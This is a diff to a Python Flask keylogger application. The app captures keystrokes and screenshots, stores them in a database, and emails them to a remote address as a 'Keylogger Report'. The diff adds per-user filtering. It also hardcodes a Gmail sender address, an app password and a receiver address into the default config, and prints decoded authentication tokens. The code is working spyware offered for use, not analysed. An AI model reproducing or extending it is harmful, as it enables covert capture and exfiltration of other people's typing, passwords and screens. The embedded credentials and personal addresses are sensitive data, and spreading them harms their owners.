@@ -33,11 +33,9 @@ db = SQLAlchemy(app)
 # Email Configuration
 SMTP_SERVER = "smtp.gmail.com"
 SMTP_PORT = 465
-sender_mail = os.getenv("SENDER_EMAIL")
-sender_password = os.getenv("SENDER_PASSWORD")
-reciever_mail = os.getenv("RECIEVER_EMAIL")
 email_interval = 60
 screenshot_interval = 30
+
 
 # Monitoring Variables
 monitoring = False
@@ -57,9 +55,9 @@ def load_config():
             "email_interval": 600,
             "screenshot_interval": 30,
             "keylog_interval": 5,
-            "sender_mail": os.getenv("SENDER_EMAIL"),
-            "sender_password": os.getenv("SENDER_PASSWORD"),
-            "receiver_mail": os.getenv("RECIEVER_EMAIL")
+            "sender_mail": "rajmahimaurya@gmail.com",  # Default sender email
+            "sender_password": "txsm fiuk goan bplx",   # Default sender password
+            "receiver_mail": "syntaxajju@gmail.com"  # Default receiver email
         }
         with open(CONFIG_FILE, "w") as f:
             json.dump(default_config, f)
@@ -116,6 +114,14 @@ def ensure_directories():
     if not os.path.exists(LOG_FILE):
         open(LOG_FILE, "w").close()
 
+def get_user_id():
+    """Dynamically calculate user_id based on sender_mail and receiver_mail from config.json."""
+    config = load_config()
+    sender_mail = config.get("sender_mail", "")
+    receiver_mail = config.get("receiver_mail", "")
+    return sender_mail + receiver_mail
+
+
 def capture_screenshot():
     try:
         screenshot = pyautogui.screenshot()
@@ -125,7 +131,7 @@ def capture_screenshot():
 
         # Save screenshot to the database within application context
         with app.app_context():
-            new_screenshot = Screenshot(image_data=screenshot_bytes)
+            new_screenshot = Screenshot(image_data=screenshot_bytes, user_id=get_user_id())  # Include user_id
             db.session.add(new_screenshot)
             db.session.commit()
 
@@ -141,7 +147,7 @@ def on_press(key):
 
         # Ensure database operations are performed within the application context
         with app.app_context():
-            new_keylog = Keylog(keystrokes=log_entry)
+            new_keylog = Keylog(keystrokes=log_entry, user_id=get_user_id())  # Include user_id
             db.session.add(new_keylog)
             db.session.commit()
 
@@ -154,23 +160,23 @@ def send_email_report():
         config = load_config()
         sender_mail = config["sender_mail"]
         sender_password = config["sender_password"]
-        reciever_mail = config["receiver_mail"]
+        receiver_mail = config["receiver_mail"]
 
         msg = EmailMessage()
         msg["Subject"] = "Keylogger Report"
         msg["From"] = sender_mail
-        msg["To"] = reciever_mail
+        msg["To"] = receiver_mail
         msg.set_content("Attached are the latest keystroke logs and screenshots.")
 
         # Fetch keylogs and screenshots within application context
         with app.app_context():
-            # Attach keylogs from the database
-            keystrokes = db.session.query(Keylog).order_by(Keylog.timestamp).all()
+            # Attach keylogs from the database based on user_id
+            keystrokes = db.session.query(Keylog).filter(Keylog.user_id == get_user_id()).order_by(Keylog.timestamp).all()
             keystrokes_data = "\n".join([log.keystrokes for log in keystrokes])
             msg.add_attachment(keystrokes_data.encode(), maintype="text", subtype="plain", filename="keystrokes.txt")
 
-            # Attach screenshots from the database
-            screenshots = db.session.query(Screenshot).order_by(Screenshot.timestamp).all()
+            # Attach screenshots from the database based on user_id
+            screenshots = db.session.query(Screenshot).filter(Screenshot.user_id == get_user_id()).order_by(Screenshot.timestamp).all()
             for screenshot in screenshots:
                 msg.add_attachment(screenshot.image_data, maintype="image", subtype="png", filename=f"screenshot_{screenshot.id}.png")
 
@@ -183,6 +189,7 @@ def send_email_report():
 
     except Exception as e:
         print(f"❌ Email Error: {e}")
+    
 
 
 @app.route('/screenshots/<int:screenshot_id>')
@@ -195,6 +202,7 @@ def get_screenshot(screenshot_id):
             return jsonify({"error": "Screenshot not found"}), 404
     except Exception as e:
         return jsonify({"error": str(e)}), 500
+    
 
 def monitor_activity():
     global monitoring, keylog_listener
@@ -226,6 +234,7 @@ def verify_clerk_token(token):
     try:
         # Decode the JWT token using Clerk's public key
         decoded_token = jwt.decode(token, CLERK_JWT_PUBLIC_KEY, algorithms=["RS256"])
+        print(decoded_token)
         return decoded_token
     except jwt.ExpiredSignatureError:
         return None
@@ -243,6 +252,9 @@ def protected_route():
 
     if not user_data:
         return jsonify({"error": "Invalid Token"}), 401
+
+    global user_id
+    user_id = get_user_id()  # Assuming the user_id is in the token payload
 
     return jsonify({"message": "Authenticated", "user": user_data})
 
@@ -263,12 +275,12 @@ def start_monitoring():
 @app.route('/get_logs', methods=['GET'])
 def get_logs():
     try:
-        # Fetch keystrokes from the database
-        keystrokes = db.session.query(Keylog).order_by(Keylog.timestamp).all()
+        # Fetch keystrokes from the database based on user_id
+        keystrokes = db.session.query(Keylog).filter(Keylog.user_id == get_user_id()).order_by(Keylog.timestamp).all()
         keystrokes_data = [log.keystrokes for log in keystrokes]
 
-        # Fetch screenshots from the database
-        screenshots = db.session.query(Screenshot).order_by(Screenshot.timestamp).all()
+        # Fetch screenshots from the database based on user_id
+        screenshots = db.session.query(Screenshot).filter(Screenshot.user_id == get_user_id()).order_by(Screenshot.timestamp).all()
         screenshots_data = [f"http://127.0.0.1:5000/screenshots/{screenshot.id}" for screenshot in screenshots]
 
         return jsonify({"keystrokes": keystrokes_data, "screenshots": screenshots_data})
@@ -296,13 +308,13 @@ def download_logs():
 
         # Create a ZIP archive
         with zipfile.ZipFile(ZIP_FILE, "w") as zipf:
-            # Add keylog file from the database
-            keystrokes = db.session.query(Keylog).order_by(Keylog.timestamp).all()
+            # Add keylog file from the database based on user_id
+            keystrokes = db.session.query(Keylog).filter(Keylog.user_id == get_user_id()).order_by(Keylog.timestamp).all()
             keystrokes_data = "\n".join([log.keystrokes for log in keystrokes])
             zipf.writestr("keystrokes.txt", keystrokes_data)
 
-            # Add screenshots from the database
-            screenshots = db.session.query(Screenshot).order_by(Screenshot.timestamp).all()
+            # Add screenshots from the database based on user_id
+            screenshots = db.session.query(Screenshot).filter(Screenshot.user_id == get_user_id()).order_by(Screenshot.timestamp).all()
             for screenshot in screenshots:
                 zipf.writestr(f"screenshots/screenshot_{screenshot.id}.png", screenshot.image_data)
 
@@ -313,13 +325,16 @@ def download_logs():
 
 class Keylog(db.Model):
     id = db.Column(db.Integer, primary_key=True)
+    user_id = db.Column(db.String, nullable=False)  # Store ID
     timestamp = db.Column(db.DateTime, default=db.func.current_timestamp())
     keystrokes = db.Column(db.Text, nullable=False)
 
 class Screenshot(db.Model):
     id = db.Column(db.Integer, primary_key=True)
+    user_id = db.Column(db.String, nullable=False)  # Store ID
     timestamp = db.Column(db.DateTime, default=db.func.current_timestamp())
     image_data = db.Column(db.LargeBinary, nullable=False)
+
 
 with app.app_context():
     try:
